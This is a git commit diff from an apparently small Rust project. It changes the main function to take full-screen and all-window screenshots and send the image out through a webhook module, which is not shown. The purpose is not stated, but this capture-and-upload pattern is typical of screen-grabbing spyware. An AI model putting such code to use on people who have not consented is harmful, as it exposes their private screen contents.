362e0d0c37be006a35435c3022362fd2f462ca31
TTF-fog <74908128+TTF-fog@users.noreply.github.com>
2024-10-19 19:23:46 +0530

    feat: webhook send image

--- src/main.rs
+++ src/main.rs
@@ -1,10 +1,15 @@
 use xcap::Monitor;
 use crate::screenshot_all::window_screenshot;
+use crate::webhook_handler::send_files;
 
 pub mod screenshot_all;
 
+mod webhook_handler;
 
-fn main() {
-    screenshot_all::full_screenshot();
+
+#[tokio::main]
+async fn main() {
+
     println!("{:?}", window_screenshot("all".to_string()));
+    send_files(screenshot_all::full_screenshot().as_str()).await;
 }
